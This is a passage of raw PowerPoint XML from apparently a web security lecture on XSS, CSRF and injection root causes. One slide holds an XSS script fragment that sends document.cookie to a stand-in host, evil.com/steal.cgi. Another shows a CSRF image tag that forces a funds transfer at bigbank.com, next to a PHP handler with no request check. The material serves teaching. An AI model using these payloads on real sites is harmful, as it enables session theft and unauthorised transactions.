              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>steal.cgi?cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Welcome!&lt;/HTML&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Picture 12" descr="Serv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358" y="5148357"/>
            <a:ext cx="965423" cy="1112691"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="452285" y="6261048"/>
            <a:ext cx="2613538" cy="300082"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>steal.cgi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text Box 29"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1808523" y="5626997"/>
            <a:ext cx="2514600" cy="242888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBE0E3"/>
          </a:solidFill>
          <a:ln w="28440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr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ＭＳ Ｐゴシック" charset="0"/>
                <a:cs typeface="Arial"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5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>GET/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>steal.cgi?cookie=</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text Box 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7336047" y="1030300"/>
            <a:ext cx="1329408" cy="402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ＭＳ Ｐゴシック" charset="0"/>
                <a:cs typeface="Arial"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5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>naive.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text Box 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4683528" y="1178730"/>
            <a:ext cx="1765300" cy="623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square"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ＭＳ Ｐゴシック" charset="0"/>
                <a:cs typeface="Arial"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5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="154000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="000000"/>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Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>victim</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>browser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42762238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CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-site request forgery (CSRF): force victim browser to send request to external website → performs task on browser’s behalf</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23270553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CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="901257" y="1925292"/>
            <a:ext cx="1297263" cy="431483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Browser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6051534" y="1925292"/>
            <a:ext cx="2182675" cy="140641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Web A</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6051534" y="4833712"/>
            <a:ext cx="2182675" cy="140641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Web B</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="8" name="Straight Arrow Connector 7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2198520" y="2102801"/>
            <a:ext cx="38530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H="1">
            <a:off x="2198520" y="2596565"/>
            <a:ext cx="38530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2198520" y="3142748"/>
            <a:ext cx="38530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a:off x="2198520" y="5220439"/>
            <a:ext cx="38530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2198520" y="5793931"/>
            <a:ext cx="38530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359238" y="1761432"/>
            <a:ext cx="1593217" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. Login Web A</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2881313" y="2186924"/>
            <a:ext cx="2647405" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. Verify, Generate Cookie</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2198520" y="4806402"/>
            <a:ext cx="4613876" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. Visit Web B while the Cookie does not expire </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2653863" y="5328134"/>
            <a:ext cx="2874855" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>4. Request Browser to visit A</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2653863" y="3147045"/>
            <a:ext cx="3397671" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>5. Forced by (4) to visit A; the browser will automatically use the cookie</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5714864" y="1174921"/>
            <a:ext cx="2847075" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>6. Accept the cookie; perform actions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2355001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CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>force load </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>=“http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>www.bigbank.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>transferFunds.php?from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>User&amp;to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:latin typeface="Courier" charset="0"/>
                <a:cs typeface="Courier" charset="0"/>
              </a:rPr>
              <a:t>=Attacker”/&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="2" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" dirty="0">
                <a:latin typeface="Times New Roman" charset="0"/>
              </a:rPr>
              <a:t>Server side</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>session_start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>isset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>($_REQUEST['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>toBankId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'] &amp;&amp;　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>isset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>($_REQUEST['money']))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>buy_stocks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>($_REQUEST['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>toBankId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'],　$_REQUEST['money']);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6600" dirty="0">
              <a:latin typeface="Times New Roman" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1298508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to Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Root-cause</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data from untrusted source gets executed!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Solutions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Check whether the data collected from untrusted source gets executed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The injected data (instructions) do not match with the instructions executed by the CPU. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36305496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Taint Analysis</a:t>
            </a:r>
